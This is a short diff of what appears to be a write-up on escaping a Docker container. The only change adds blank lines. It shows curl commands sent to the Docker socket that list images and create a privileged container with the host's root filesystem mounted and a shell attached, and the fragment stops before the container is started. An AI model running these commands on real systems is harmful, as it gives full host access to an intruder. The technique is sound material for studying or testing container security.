@@ -115,16 +115,25 @@ Right here, I have spent a lot of time and even stayed up all night using resour
 First, create a container for Docker and then you can access the file system here:
 
 Get the available images
+
 curl --unix-socket /var/run/docker.sock http://localhost/images/json
 
 curl -X POST --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{
+
 "Image": "php:8.1-cli",
+
 "Cmd": ["/bin/sh"],
+
 "Tty": true,
+
 "HostConfig": {
+
 "Privileged": true,
+
 "Binds": ["/:/host"]
+
 }
+
 }' http://localhost/containers/create
 
 Save id from previous script
